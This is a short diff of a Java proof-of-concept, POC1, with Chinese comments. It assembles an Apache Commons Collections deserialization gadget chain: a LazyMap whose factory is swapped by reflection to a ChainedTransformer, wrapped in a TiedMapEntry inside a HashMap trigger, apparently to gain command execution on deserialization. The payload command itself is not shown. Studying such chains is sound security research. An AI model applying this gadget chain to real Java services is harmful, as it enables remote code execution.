@@ -37,7 +37,7 @@ public class POC1 {
 
         HashMap map = new HashMap();
         Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏
-
+//        Map lazymap = LazyMap.decorate(map,chainedTransformer);
         TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");
 
         HashMap<Object, Object> map2 = new HashMap<>();//这里是触发点
@@ -49,7 +49,7 @@ public class POC1 {
         factoryField.setAccessible(true);//私有属性
         factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数
 
-        Serialization(map2);
+//        Serialization(map2);
         Unserialization();
     }
 }
